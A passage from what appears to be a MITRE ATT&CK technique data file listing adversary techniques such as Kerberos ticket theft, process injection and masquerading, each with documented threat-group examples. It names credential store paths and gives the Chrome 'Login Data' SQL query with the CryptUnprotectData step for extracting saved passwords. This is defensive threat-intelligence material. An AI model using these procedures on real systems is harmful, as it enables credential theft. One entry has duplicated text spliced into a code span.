(CVE-2018-13379).', '[SoreFang] can gain access by exploiting a Sangfor SSL VPN vulnerability that allows for the placement and delivery of malicious update binaries.', '[ZxShell] has been dropped through exploitation of CVE-2011-2462, CVE-2013-3163, and CVE-2014-0322.', '[COATHANGER] is installed following exploitation of a vulnerable FortiGate device. ', '[Fox Kitten] has exploited known vulnerabilities in Fortinet, PulseSecure, and Palo Alto VPN appliances.', '[Cinnamon Tempest] has exploited multiple unpatched vulnerabilities for initial access including vulnerabilities in Microsoft Exchange, Manage Engine AdSelfService Plus, Confluence, and Log4j.', '[Ke3chang] has compromised networks by exploiting Internet-facing applications, including vulnerable Microsoft Exchange and SharePoint servers.', 'During [Operation CuckooBees] the threat actors exploited multiple vulnerabilities in externally facing servers.', 'During the [SolarWinds Compromise] [APT29] exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.', 'During [Cutting Edge] threat actors exploited CVE-2023-46805 and CVE-2024-21887 in Ivanti Connect Secure VPN appliances to enable authentication bypass and command injection. A server-side request forgery (SSRF) vulnerability, CVE-2024-21893, was identified later and used to bypass mitigations for the initial two vulnerabilities by chaining with CVE-2024-21887.', '[menuPass] has leveraged vulnerabilities in Pulse Secure VPNs to hijack sessions.', '[ToddyCat] has exploited the ProxyLogon vulnerability (CVE-2021-26855) to compromise Exchange Servers at multiple organizations.', '[Blue Mockingbird] has gained initial access by exploiting CVE-2019-18935, a vulnerability within Telerik UI for ASP.NET AJAX.', '[GALLIUM] exploited a publicly-facing servers including Wildfly/JBoss servers to gain access to the network.', '[Earth Lusca] has compromised victims by directly exploiting vulnerabilities of public-facing servers, including those associated with Microsoft Exchange and Oracle GlassFish.', '[APT29] has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access.', '[Volatile Cedar] has targeted publicly facing web servers, with both automatic and manual vulnerability discovery.  ', '[Havij] is used to automate SQL injection.', '[Moses Staff] has exploited known vulnerabilities in public-facing infrastructure such as Microsoft Exchange Servers.', '[Dragonfly] has conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange, and CVE-2018-13379 for Fortinet VPNs.', '[Axiom] has been observed using SQL injection to gain access to systems.', '[APT41] exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central through unsafe deserialization, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices. [APT41] leveraged vulnerabilities such as ProxyLogon exploitation or SQL injection for initial access.', '[HAFNIUM] has exploited CVE-2021-44228 in Log4j and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server.   ', '[APT5] has exploited vulnerabilities in externally facing software and devices including Pulse Secure VPNs and Citrix Application Delivery Controllers. ', '[MuddyWater] has exploited the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688).', '[APT39] has used SQL injection for initial compromise.', '[UNC2452] exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.', '[Operation Wocao] has gained initial access via vulnerable webservers.', '[Night Dragon] has performed SQL injection attacks of extranet web servers to gain access.']",False
T1558,Steal or Forge Kerberos Tickets,"Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket] Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC). Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.  On Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.  Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the ""ccache"". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts. On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket] The ccache file may also be converted into a Windows format using tools such as Kekeo.   Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets. ",[],False
T1555,Credentials from Password Stores,"Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.","['[HEXANE] has run `cmdkey` on victim machines to identify stored credentials.', '[Carberp] passw.plug plugin can gather account information from multiple instant messaging, email, and social media services, as well as FTP, VNC, and VPN clients.', '[Mimikatz] performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the credential vault and DPAPI.\t', '[Lokibot] has stolen credentials from multiple applications and data sources including Windows OS credentials, email clients, FTP, and SFTP clients.', '[Volt Typhoon] has attempted to obtain credentials from OpenSSH, realvnc, and PuTTY.', '[Leafminer] used several tools for retrieving login and password information, including LaZagne.', '[Matryoshka] is capable of stealing Outlook passwords.', '[Stealth Falcon] malware gathers passwords from multiple sources, including Windows Credential Vault and Outlook.', '[CosmicDuke] collects user credentials, including passwords, for various programs including popular instant messaging applications and email clients as well as WLAN keys.', 'A module in [Prikormka] collects passwords stored in applications installed on the victim.', '[PLEAD] has the ability to steal saved passwords from Microsoft Outlook.', '[APT39] has used the Smartftp Password Decryptor tool to decrypt FTP passwords.', '[Evilnum] can collect email credentials from victims.', '[DarkGate] use Nirsoft Network Password Recovery or NetPass tools to steal stored RDP credentials in some malware versions.', '[NETWIRE] can retrieve passwords from messaging and mail client applications.', '[APT33] has used a variety of publicly available tools like [LaZagne] to gather credentials.', '[MuddyWater] has performed credential dumping with [LaZagne] and other tools, including by dumping passwords saved in victim email.', '[QuasarRAT] can obtain passwords from common FTP clients.', '[Astaroth] uses an external software known as NetPass to recover passwords. ', '[Agent Tesla] has the ability to steal credentials from FTP clients and wireless profiles.', '[LaZagne] can obtain credentials from databases, mail, and WiFi across multiple platforms.', '[OLDBAIT] collects credentials from several email clients.', '[PinchDuke] steals credentials from compromised hosts. [PinchDuke] credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by [PinchDuke] include ones associated with many sources such as The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, and Microsoft Outlook.', '[OilRig] has used credential dumping tools such as [LaZagne] to steal credentials to accounts logged into the compromised system and to Outlook Web Access.', '[FIN6] has used the Stealer One credential stealer to target e-mail and file transfer utilities including FTP.', 'During the [SolarWinds Compromise] [APT29] used account credentials they obtained to attempt access to Group Managed Service Account (gMSA) passwords. ', '[Malteiro] has obtained credentials from mail clients via NirSoft MailPassView.', '[Mispadu] has obtained credentials from mail clients via NirSoft MailPassView.', '[Pupy] can use Lazagne for harvesting credentials.', '[PoshC2] can decrypt passwords stored in the RDCMan configuration file.', '[KGH_SPY] can collect credentials from WINSCP.', '[APT29] used account credentials they obtained to attempt access to Group Managed Service Account (gMSA) passwords.', '[UNC2452] used account credentials they obtained to attempt access to Group Managed Service Account (gMSA) passwords.']",False
T1567,Exfiltration Over Web Service,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.  Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.","['[Magic Hound] has used the Telegram API `sendMessage` to relay data on compromised devices.', '[APT28] can exfiltrate data over Google Drive. ', '[DropBook] has used legitimate web services to exfiltrate data.', '[AppleSeed] has exfiltrated files using web services.', '[ngrok] has been used by threat actors to configure servers for data exfiltration.', 'During [C0017] [APT41] used Cloudflare services for data exfiltration.', '[Ngrok] has been used by threat actors to configure servers for data exfiltration.']",False
T1219,Remote Access Software,"An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.  Remote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary-controlled system.   Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.  Installation of many remote access software may also include persistence (e.g., the software's installation routine creates a [Windows Service] Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome’s Remote Desktop).","['[TeamTNT] has established tmate sessions for C2 communications.', '[Dridex] contains a module for VNC.', '[RTM] has the capability to download a VNC module from command and control (C2).', '[EVILNUM] has used the malware variant, TerraTV, to run a legitimate TeamViewer application to connect to compromrised machines.', '[Mustang Panda] has installed TeamViewer on targeted systems.', '[FIN7] has utilized the remote management tool Atera to download malware to a compromised system.', 'During [C0018] the threat actors used AnyDesk to transfer tools between systems.', '[Kimsuky] has used a modified TeamViewer client as a command and control channel.', '[Thrip] used a cloud-based remote access software called LogMeIn for their attacks.', '[GOLD SOUTHFIELD] has used the cloud-based remote management and monitoring tool ""ConnectWise Control"" to deploy [REvil]', '[RTM] has used a modified version of TeamViewer and Remote Utilities for remote access.', '[Carbanak] has a plugin for VNC and Ammyy Admin Tool.', 'During [C0027] [Scattered Spider] directed victims to run remote monitoring and management (RMM) tools.  In addition to directing victims to run remote software, Scattered Spider members themselves also deploy RMM software including AnyDesk, LogMeIn, and ConnectWise Control to establish persistence on the compromised network.', '[DarkVishnya] used DameWare Mini Remote Control for lateral movement.', '[TrickBot] uses vncDll module to remote control the victim machine.', '[Hildegard] has established tmate sessions for C2 communications.', 'During [C0027] [Scattered Spider] directed victims to run remote monitoring and management (RMM) tools.', '[Sandworm Team] has used remote administration tools or remote industrial control system client software for execution and to maliciously release electricity breakers.', '[Carbanak] used legitimate programs such as AmmyyAdmin and Team Viewer for remote interactive C2 to target systems.', 'During [C0015] the threat actors installed the AnyDesk remote desktop application onto the compromised network.', 'During [Night Dragon] threat actors used several remote administration tools as persistent infiltration channels.', '[Egregor] has checked for the LogMein event log in an attempt to encrypt files in remote machines.', '[MuddyWater] has used legitimate applications ScreenConnect and AteraAgent to manage systems remotely and move laterally.', '[Akira] uses legitimate utilities such as AnyDesk and PuTTy for maintaining remote access to victim environments.', '[Cobalt Group] used the Ammyy Admin tool as well as TeamViewer for remote access, including to preserve remote access if a Cobalt Strike module was lost.', '[Night Dragon] has used several remote administration tools as persistent infiltration channels.']",False
T1079,Multilayer Encryption,"An adversary performs C2 communications using multiple layers of encryption, typically (but not exclusively) tunneling a custom encryption scheme within a protocol encryption scheme such as HTTPS or SMTPS.","['[Pupy] can use Obfs3, a pluggable transport, to add another layer of encryption and obfuscate TLS.']",True
T1036,Masquerading,"Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.  Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading]","['[menuPass] has used [esentutl] to change file extensions to their true type that were masquerading as .txt files. ', '[APT32] has disguised a Cobalt Strike beacon as a Flash Installer.', ""[FatDuke] has attempted to mimic a compromised user's traffic by using the same user agent as the installed browser."", '[Raindrop] was built to include a modified version of 7-Zip source code (including associated export names) and Far Manager source code.', '[BRONZE BUTLER] has masked executables with document file icons including Word and Adobe PDF.', '[AppleSeed] can disguise JavaScript files as PDFs.', '[OilRig] has used .doc file extensions to mask malicious executables.', '[Sandworm Team] masqueraded malicious installers as Windows update packages to evade defense and entice users to execute binaries.', '[Saint Bot] has renamed malicious binaries as `wallpaper.mp4` and `slideshow.mp4` to avoid detection.', '[Nomadic Octopus] attempted to make [Octopus] appear as a  Telegram Messenger with a Russian interface.', '[XCSSET] builds a malicious application bundle to resemble Safari through using the Safari icon and <code>Info.plist</code>. ', '[DarkTortilla] payload has been renamed `PowerShellInfo.exe`.', '[FoggyWeb] can masquerade the output of C2 commands as a fake, but legitimately formatted WebP file.', '[Flagpro] can download malicious files with a .tmp extension and append them with .exe prior to execution.', '[PowGoop] has disguised a PowerShell script as a .dat file (goopdate.dat).', '[Milan] has used an executable named `companycatalogue` to appear benign.', '[WindTail] has used icons mimicking MS Office files to mask payloads.', '[BoomBox] has the ability to mask malicious data strings as PDF files.', '[TeamTNT] has disguised their scripts with docker-related file names.', '[LazyScripter] has used several different security software icons to disguise executables. ', '[Dragonfly] has created accounts disguised as legitimate backup and service accounts as well as an email administration account.', '[APT28] has renamed the WinRAR utility to avoid detection.', '[Ramsay] has masqueraded as a JPG image file.', '[ZIRCONIUM] has spoofed legitimate applications in phishing lures and changed file extensions to conceal  installation of malware.', '[FIN13] has masqueraded staged data by using the Windows [certutil] utility to generate fake Base64 encoded certificates with the input file.', 'The [TrickBot] downloader has used an icon to appear as a Microsoft Word document.', '[NotPetya] drops [PsExec] with the filename dllhost.dat.', 'For [Operation Dust Storm] the threat actors disguised some executables as JPG files. ', '[Windshift] has used icons mimicking MS Office files to mask malicious executables. [Windshift] has also attempted to hide executables by changing the file extension to "".scr"" to mimic Windows screensavers.', '[NativeZone] has, upon execution, displayed a message box that appears to be related to a Ukrainian electronic document management system.', '[WhisperGate] has been disguised as a JPG extension to avoid detection as a malicious PE file.', '[Ryuk] can create .dll files that actually contain a Rich Text File format document.', '[DarkWatchman] has used an icon mimicking a text file to mask a malicious executable.', '[RCSession] has used a file named English.rtf to appear benign on victim hosts.', 'The [Dacls] Mach-O binary has been disguised as a .nib file.', '[TrailBlazer] has used filenames that match the name of the compromised system in attempt to avoid detection.', 'During [C0018] [AvosLocker] was disguised using the victim company name as the filename.', '[EnvyScout] has used folder icons for malicious files to lure victims into opening them.', 'During [C0015] the threat actors named a binary file `compareForfor.jpg` to disguise it as a JPG file.', '[TA551] has masked malware DLLs as dat and jpg files.', '[PLATINUM] has renamed rar.exe to avoid detection.', '[SombRAT] can use a legitimate process name to hide itself.', '[RTM] has been delivered as archived Windows executable files masquerading as PDF documents.\t', '[DarkGate] can masquerade as pirated media content for initial delivery to victims.', 'During [Operation Honeybee] the threat actors modified the MaoCheng dropper so its icon appeared as a Word document.', ' [Bisonal] dropped a decoy payload with a .jpg extension that contained a malicious Visual Basic script. ', '[Kimsuky] has disguised its C2 addresses as the websites of shopping malls, governments, universities, and others.', 'During the [SolarWinds Compromise] [APT29] set the hostnames of their C2 infrastructure to match legitimate hostnames in the victim environment. They also used IP addresses originating from the same country as the victim for their VPN infrastructure.', '[APT29] has set the hostnames of its C2 infrastructure to match legitimate hostnames in the victim environment. They have also used IP addresses originating from the same country as the victim for their VPN infrastructure.', '[TRITON] attempts to write a dummy program into memory if it fails to reset the Triconex controller.', '[UNC2452] set the hostnames of its C2 infrastructure to match legitimate hostnames in the victim environment. They also primarily used IP addresses originating from the same country as the victim for their VPN infrastructure.', '[Lazarus Group] has disguised malicious template files as JPEG files to avoid detection.', '[Dragonfly 2.0] created accounts disguised as legitimate backup and service accounts as well as an email administration account.', '[Mustang Panda] has used an additional filename extension to hide the true file type.', '[QuasarRAT] has dropped binaries as files named microsoft_network.exe and crome.exe.', '[yty] contains several references to football (including ""football,"" ""score,"" ""ball,"" and ""loose"") in a likely attempt to disguise its traffic.', 'Accounts created by Dragonfly masqueraded as legitimate service accounts.']",False
T1552,Unsecured Credentials,"Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History] operating system or application-specific repositories (e.g. [Credentials in Registry]  or other specialized files/artifacts (e.g. [Private Keys]","['[DarkGate] uses NirSoft tools to steal user credentials from the infected machine. NirSoft tools are executed via process hollowing in a newly-created instance of vbc.exe or regasm.exe.', '[Pacu] can search for sensitive data: for example, in Code Build environment variables, EC2 user data, and Cloud Formation templates.', '[Astaroth] uses an external software known as NetPass to recover passwords. ']",False
T1659,Content Injection,"Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target] followed by [Drive-by Compromise] adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer] and other data to already compromised systems.  Adversaries may inject content to victim systems in various ways, including:  * From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle] which describes AiTM activity solely within an enterprise environment)  * From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server   Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with ""lawful interception.""","['[Disco] has achieved initial access and execution through content injection into DNS,  HTTP, and SMB replies to targeted hosts that redirect them to download malicious files.', '[MoustachedBouncer] has injected content into DNS, HTTP, and SMB replies to redirect specifically-targeted victims to a fake Windows Update page to download malware.']",False
T1055,Process Injection,"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.   There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.   More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ","['[Agent Tesla] can inject into known, vulnerable binaries on targeted hosts. ', '[Lizar] can migrate the loader into another process.', '[SLOTHFULMEDIA] can inject into running processes on a compromised host.', '[IronNetInjector] can use an IronPython scripts to load a .NET injector to inject a payload into its own or a remote process.', '[BADHATCH] can inject itself into an existing explorer.exe process by using `RtlCreateUserThread`.', '[HyperBro] can run shellcode it injects into a newly created process.', '[Sliver] can inject code into local and remote processes.', '[Bazar] can inject code through calling <code>VirtualAllocExNuma</code>.', '[Silence] has injected a DLL library containing a Trojan into the fwmain32.exe process.', '[TSCookie] has the ability to inject code into the svchost.exe, iexplorer.exe, explorer.exe, and default browser processes.', '[REvil] can inject itself into running processes on a compromised host.', '[Donut] includes a subproject <code>DonutTest</code> to inject shellcode into a target process.\t', '[BBK] has the ability to inject shellcode into svchost.exe.', 'During [Cutting Edge] threat actors used malicious SparkGateway plugins to inject shared objects into web process memory on compromised Ivanti Secure Connect VPNs to enable deployment of backdoors.', '[GuLoader] has the ability to inject shellcode into a donor processes that is started in a suspended state. [GuLoader] has previously used RegAsm as a donor process.', '[APT32] malware has injected a Cobalt Strike beacon into Rundll32.exe.', '[Wizard Spider] has used process injection to execute payloads to escalate privileges.', '[ANDROMEDA] can inject into the `wuauclt.exe` process to perform C2 actions.', '[COATHANGER] includes a binary labeled `authd` that can inject a library into a running process and then hook an existing function within that process with a new function from that library.', '[AuditCred] can inject code from files to other running processes.', '[gh0st RAT] can inject malicious code into process created by the “Command_Create&Inject” function.', '[NETWIRE] can inject code into system processes including notepad.exe, svchost.exe, and vbc.exe.', '[Backdoor.Oldrea] injects itself into explorer.exe.', '[Remcos] has a command to hide itself through injecting into another process.', '[Waterbear] can inject decrypted shellcode into the LanmanServer service.', '[SILENTTRINITY] can inject shellcode directly into Excel.exe or a specific process.', '[Cobalt Strike] can inject a variety of payloads into processes dynamically chosen by the adversary.', '[HTRAN] can inject into into running processes.', '[Clambling] can inject into the `svchost.exe` process for execution.', '[Wiarp] creates a backdoor through which remote attackers can inject files into running processes.', '[TA2541] has injected malicious code into legitimate .NET related processes including  regsvcs.exe, msbuild.exe, and installutil.exe.', '[Cobalt Group] has injected code into trusted processes.', '[Mispadu] binary is injected into memory via `WriteProcessMemory`.', '[JPIN] can inject content into lsass.exe to load a module.', ""[StoneDrill] has relied on injecting its payload directly into the process memory of the victim's preferred browser."", '[NavRAT] copies itself into a running Internet Explorer process to evade detection.', '[QakBot] can inject itself into processes including explore.exe, Iexplore.exe, Mobsync.exe., and wermgr.exe.', '[Bumblebee] can inject code into multiple processes on infected endpoints.', '[Empire] contains multiple modules for injecting into processes, such as <code>Invoke-PSInject</code>.', '[APT37] injects its malware variant, [ROKRAT] into the cmd.exe process.', '[Gazer] injects its communication module into an Internet accessible process through which it performs C2.', '[Woody RAT] can inject code into a targeted process by writing to the remote memory of an infected system and then create a remote thread. ', '[InvisiMole] can inject itself into another process to avoid detection including use of a technique called ListPlanting that customizes the sorting algorithm in a ListView structure.', 'During [Operation Wocao] threat actors injected code into a selected process, which in turn launches a command as a child process of the original.', '[Smoke Loader] injects into the Internet Explorer process.', '[PoshC2] contains multiple modules for injecting into processes, such as <code>Invoke-PSInject</code>.', '[Ninja] has the ability to inject an agent module into a new process and arbitrary shellcode into running processes.', '[ABK] has the ability to inject shellcode into svchost.exe.', '[Avenger] has the ability to inject shellcode into svchost.exe.', 'During [Operation Sharpshooter] threat actors leveraged embedded shellcode to inject a downloader into the memory of Word.    ', '[CostaBricks] can inject a payload into the memory of a compromised host.', '[Cardinal RAT] injects into a newly spawned process created from a native Windows executable.', '[Attor] dispatcher can inject itself into running processes to gain higher privileges and to evade detection.', '[Ryuk] has injected itself into remote processes to encrypt files using a combination of <code>VirtualAlloc</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code>.', '[WarzoneRAT] has the ability to inject malicious DLLs into a specific process for privilege escalation.', '[Kimsuky] has used Win7Elevate to inject malicious code into explorer.exe.', '[APT5] has used the CLEANPULSE utility to insert command line strings into a targeted process to alter its functionality.', '[PLATINUM] has used various methods of process injection including hot patching.', '[ShadowPad] has injected an install module into a newly created process.', '[ROKRAT] can use `VirtualAlloc`, `WriteProcessMemory`, and then `CreateRemoteThread` to execute shellcode within the address space of `Notepad.exe`.', '[HOPLIGHT] has injected into running processes.\t', '[Mis-Type] has been injected directly into a running process, including `explorer.exe`.', '[Dyre] has the ability to directly inject its code into the web browser process.', '[JHUHUGIT] performs code injection injecting its own functions to browser processes.', '[Pandora] can start and inject code into a new `svchost` process.', '[TrickBot] has used <code>Nt*</code> [Native API] functions to inject code into legitimate processes such as <code>wermgr.exe</code>.', 'The [PcShare] payload has been injected into the `logagent.exe` and `rdpclip.exe` processes.', '[APT41] malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process.', '[Wingbird] performs multiple process injections to hijack system processes and execute malicious code.', '[Egregor] can inject its payload into iexplore.exe process.', '[metaMain] can inject the loader file, Speech02.db, into a process.', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] loaded [BlackEnergy] into svchost.exe, which then launched iexplore.exe for their C2. ', '[Turla] has also used [PowerSploit] <code>Invoke-ReflectivePEInjection.ps1</code> to reflectively load a PowerShell payload into a random process on the victim system.', '[Honeybee] uses a batch file to load a DLL into the svchost.exe process.', '[Operation Wocao] has injected code into a selected process, which in turn launches a command as a child process of the original.', '[Sharpshooter] has leveraged embedded shellcode to inject a downloader into the memory of Word.', '[Cobalt Strike] can inject a variety of payloads into processes dynamically chosen by the adversary.', '[HiddenWasp] adds itself to the LD_PRELOAD path and sets a series of environment variables.', 'injects a malicious DLL into the IExplorer.exe process.']",False
T1139,Bash History,"Bash keeps track of the commands users type on the command-line with the ""history"" utility. Once a user logs out, the history is flushed to the user’s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. ",[],True
T1205,Traffic Signaling,"Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking] but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.  Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).  The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.  On network devices, adversaries may use crafted packets to enable [Network Device Authentication] for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image] due to the monolithic nature of the architecture.  Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.","['During [Cutting Edge] threat actors sent a magic 48-byte sequence to enable the PITSOCK backdoor to communicate via the `/tmp/clientsDownload.sock` socket.', '[ZIPLINE] can identify a specific string in intercepted network traffic, `SSH-2.0-OpenSSH_0.3xx.`, to trigger its command functionality.', '[BUSHWALK] can modify the `DSUserAgentCap.pm` Perl module on Ivanti Connect Secure VPNs and either activate or deactivate depending on the value of the user agent in incoming HTTP requests.', '[Penquin] will connect to C2 only after sniffing a ""magic packet"" value in TCP or UDP packets matching specific conditions.', '[SYNful Knock] can be sent instructions via special packets to change its functionality. Code for new functionality can be included in these messages.', '[Winnti for Linux] has used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control (C2) mechanism.', '[Chaos] provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port.', '[Umbreon] provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet.', '[Kobalos] is triggered by an incoming TCP connection to a legitimate service from a specific source port. ', '[Pandora] can identify if incoming HTTP traffic contains a token and if so it will intercept the traffic and process the received command.', '[Ryuk] has used Wake-on-Lan to power on turned off systems for lateral movement.', '[Uroburos] can intercept the first client to server packet in the 3-way TCP handshake to determine if the packet contains the correct unique value for a specific [Uroburos] implant. If the value does not match, the packet and the rest of the TCP session are passed to the legitimate listening application.', '[Umbreon] provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet', '[Chaos] provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port.']",False
T1503,Credentials from Web Browsers,"Adversaries may acquire credentials from web browsers by reading files specific to the target browser.     Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.  For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.    Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.   Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.  After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",[],True
T1218,System Binary Proxy Execution,"Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system. Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.  Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.",['[Lazarus Group] lnk files used for persistence have abused the Windows Update Client (<code>wuauclt.exe</code>) to execute a malicious DLL.'],False
T1153,Source,"**This technique has been deprecated and should no longer be used.**  The <code>source</code> command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways <code>source /path/to/filename [arguments]</code> or <code>.**This technique has been deprecated and should no longer be used.** /path/to/filename [arguments]</code>. Take note of the space after the ""."". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment.  Adversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.",[],
